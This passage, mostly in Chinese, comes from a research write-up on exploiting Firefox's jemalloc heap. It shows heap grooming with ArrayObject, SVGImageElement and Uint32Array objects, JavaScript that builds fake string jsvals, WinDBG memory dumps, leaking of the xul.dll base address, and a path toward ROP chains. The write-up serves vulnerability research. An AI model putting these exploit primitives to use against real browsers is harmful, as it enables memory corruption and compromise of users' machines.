        15f16040  69e0d1f4 00000000 00000000 00000000
        15f16050  00000000 00000000 69e0bd38 00000000
        15f16060  69f680d4 e5e50000 69f680d4 e5e50000
        15f16070  69f680d4 e5e50100 00000000 e5e5e5e5
        15f16080  69e0c9d8 69e0c24c 00000000 00000000
        15f16090  00000000 00000000 00000000 00000000
        15f160a0  00000000 e5e5e5e5 00000000 00000000
        15f160b0  00890001 e5000000 00000000 e5e5e5e5
        15f160c0  00000000 00000000 e4000001 00000000
        15f160d0  00000000 e4010101 00000000 00000000
        15f160e0  e4000201 00000000 00000000 e4010301
        15f160f0  06000106 00000001 00000000 e5e50000
        [ Uint32Array contents ]
        15f16100  51575751 51575751 51575751 51575751
        15f16110  51575751 51575751 51575751 51575751
        15f16120  51575751 51575751 51575751 51575751
        15f16130  51575751 51575751 51575751 51575751
        ...
我们在堆中已经按我们所想布置好了数据：有一个ArrayObject（带有metadata 和
数据部分），后跟一个SVGImageElement对象，后跟Uint32Array的内容。 如果我们看一些其他 run
（我们的目标大小，256），我们可能会发现其中一些run没有被布置成这样的情况。
也就是说，ArrayObject后跟一个Uint32Array，然后是一个SVGImageElement对象，
这样的内存布置不是100%发生的。但它并没有太大的影响。只要有一个run被布置就成功，我们的方法就可以使用。  
接下来，我们继续在SVGImageElement方法中触发我们假定的堆溢出bug。
这允许我们将SVGImageElement对象中的数据覆盖到我们之后放置的ArrayObject上（当然，在这种情况下是中间的Uint32Array对象）。
然后像在5.2节中那样找到pwned ArrayObject，并像在5.3中那样使用它来泄漏我们在内存中的位置（请参阅存档中的文件'arbitrary-leak.html'以获取完整代码）。 这样就可以做到任意地址泄漏。
因为我们知道SVGImageElement对象的地址，所以可以计算出邻近的Uint32Array的地址; 它之后是0x100字节。
然后我们可以在我们喷洒每个Uint32Array，在它们开头创建我们的假字符串类型jsval。
这个假的jsval将在Uint32Array初始化后指向0x10字节。 在那里将创建一个假的非内联字符串，其中包含我们想要泄漏的任意地址。
JavaScript代码如下：
    // this is the leaked address of the SVGImageElement object
        var obj_addr = parseInt(val_hex[0], 16);
        // where we will place our fake non-inline string
        var fake_jsstring_addr = obj_addr + 0x110;
        // create a fake string-type jsval at the start
        // of each sprayed Uint32Array object
        for(var i = 0; i  dd 0x15f15f00 l?90
        [ Our corrupted ArrayObject ]
        15f15f00  00000000 00000666 00000666 00000666
        15f15f10  45464645 ffffff81 47484847 ffffff81
        15f15f20  45464645 ffffff81 47484847 ffffff81
        15f15f30  45464645 ffffff81 47484847 ffffff81
        15f15f40  45464645 ffffff81 47484847 ffffff81
        15f15f50  45464645 ffffff81 47484847 ffffff81
        15f15f60  45464645 ffffff81 47484847 ffffff81
        15f15f70  45464645 ffffff81 47484847 ffffff81
        15f15f80  45464645 ffffff81 47484847 ffffff81
        15f15f90  45464645 ffffff81 47484847 ffffff81
        15f15fa0  45464645 ffffff81 47484847 ffffff81
        15f15fb0  45464645 ffffff81 47484847 ffffff81
        15f15fc0  45464645 ffffff81 47484847 ffffff81
        15f15fd0  45464645 ffffff81 47484847 ffffff81
        15f15fe0  45464645 ffffff81 47484847 ffffff81
        15f15ff0  45464645 ffffff81 47484847 ffffff81
        [ Our SVGImageElement object ]
        15f16000  69e0cf70 69e0eba0 1652da20 00000000
        15f16010  0d863c90 00000000 00020008 00000000
        15f16020  00000000 00000000 15f16000 00000000
        15f16030  00000007 00000000 00090000 00000000
        15f16040  69e0d1f4 00000000 00000000 00000000
        15f16050  00000000 00000000 69e0bd38 00000000
        15f16060  69f680d4 e5e50000 69f680d4 e5e50000
        15f16070  69f680d4 e5e50100 00000000 e5e5e5e5
        15f16080  69e0c9d8 69e0c24c 00000000 00000000
        15f16090  00000000 00000000 00000000 00000000
        15f160a0  00000000 e5e5e5e5 00000000 00000000
        15f160b0  00890001 e5000000 00000000 e5e5e5e5
        15f160c0  00000000 00000000 e4000001 00000000
        15f160d0  00000000 e4010101 00000000 00000000
        15f160e0  e4000201 00000000 00000000 e4010301
        15f160f0  06000106 00000001 00000000 e5e50000
        [ The contents of our Uint32Array ]
                  [ string jsval  ]
        15f16100  15f16110 ffffff85 51575751 51575751
                  [ fake non-inline string          ]
                           [ size ] [ addr ]
        15f16110  00000049 00000002 67c30000 00000000
        15f16120  51575751 51575751 51575751 51575751
        15f16130  51575751 51575751 51575751 51575751
WinDBG中：
    [*] corrupted array found at index: 25649
        [*] leaked xul.dll base address: 0x67c30000
        [*] victim SVGImageElement object is at: 0x15f16000
        [*] leaked: MZ
由于我们使用xul.dll（我们之前泄漏）的基地址作为泄漏的任意地址，可以先找到“MZ”，在这一点上应该清楚为什么在一些jemalloc run
中堆排列没有成功并不重要。然后可以继续尝试泄漏我们放置在所有Uint32Arrays开头的假字符串jsvals。 我们只会在堆排列成功的 run
中从jsval返回预期的“MZ”值。 在安排不起作用的
run（即Uint32Array在SVGImageElement对象之前），尝试访问索引62（存放我们的假字符串jsval）将返回一个
double，因为有两个dwords被解释为没有标签的IEEE-754 jsval。 这不会取消任何间接调用，因此不会发生崩溃。
当我们最终获得“MZ”值时，我们可以重新使用我们的假字符串jsval从我们想要的任何地址进行泄漏。
    // now we can re-use the fake string-type jsval
        // to leak from another location
        read_addr = "cafebabe"; // crash to demonstrate
        write_val_bytes = hex_to_bytes("00000000" + read_addr);
        write_val_double = bytes_to_double(write_val_bytes);
        container[pwned_index][65] = write_val_double;
        leaked = "[*] leaked: " + container[pwned_index][62];
        log(leaked);
我们的Uint32Array现在看起来是：
    [ The contents of our Uint32Array ]
                  [ string jsval  ]
        15f16100  15f16110 ffffff85 51575751 51575751
                  [ fake non-inline string          ] 
                           [ size ] [ addr ]
        15f16110  00000049 00000002 cafebabe 00000000
        15f16120  51575751 51575751 51575751 51575751
        15f16130  51575751 51575751 51575751 51575751
试图从地址cafebabe读取导致崩溃：
    0:000> g
        (858.f68): Access violation - code c0000005 (first chance)
        First chance exceptions are reported before any exception handling.
        This exception may be expected and handled.
        eax=cafebac0 ebx=00000000 ecx=133bb7f4 edx=00000000 esi=00000002
        edi=133bb7e0 eip=67df0192 esp=003ad120 ebp=cafebabe
        iopl=0         nv up ei pl nz na po nc
        cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b  efl=00010202
        xul!js::ConcatStrings+0x178:
        67df0192 mov     al,byte ptr [ebp]             ss:002b:cafebabe=??
最后，终于有一个可重用的任意泄漏原语，我们也知道xul.dll的基础。 我们可以动态搜索ROP链，并在JavaScript中的漏洞运行时构建我们的ROP链。
## 5.6 Use-after-free bugs
使用所提出的方法利用 Use-after-free bugs 是利用类型化数组（Uint32Array）回收释放对象留下的jemalloc region
的问题。 然后我们使用伪对象的方法来覆盖相邻堆喷的ArrayObject的metadata部分 ，并采用这种特定的方法。
# 6.结论
致谢。
# 7.参考文献
[INF] OR'LYEH? The Shadow over Firefox -  
[JSV] JS::Value
-  
[IFP] IEEE Standard for Floating-Point Arithmetic (IEEE-754) -  
[JSO] JSObject
-  
[P2O] Advanced Exploitation of Mozilla Firefox Use-After-Free  
Vulnerability (Pwn2Own 2014) -  
[REN] XSS and Beyond -  
[F32] Firefox Release 32.0 -  
[JSR] JSAPI User Guide -  
[PSJ] Pseudomonarchia jemallocum -  
[UNJ] unmask_jemalloc -  
[SHD] shadow -  
[FSJ] Heap Feng Shui in JavaScript -  